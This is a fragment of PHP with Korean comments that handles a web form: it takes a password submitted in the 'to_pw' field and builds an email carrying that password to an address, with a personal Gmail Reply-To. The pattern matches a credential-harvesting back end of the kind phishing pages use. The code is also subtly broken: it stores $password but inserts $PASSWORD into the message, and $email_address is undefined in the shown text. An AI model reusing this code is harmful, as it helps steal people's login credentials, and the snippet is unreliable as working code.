...
$password = strip_tags(htmlspecialchars($_POST['to_pw']));

// 이메일을 생성하고 메일을 전송하는 부분
$to = $email_address; // 받는 측의 이메일 주소를 기입하는 부분
$email_subject = "FROM:  PATH"; // 메일 제목에 해당하는 부분
$email_body = "본 메일은 홈페이지 폼메일로부터 전송된 이메일입니다..\n\n"."세부정보는 다음과 같습니다.\n\n비밀번호: $PASSWORD\n\n";
$headers = "Reply-To: chlwlgus119@gmail.com\r"; // 답장 주소
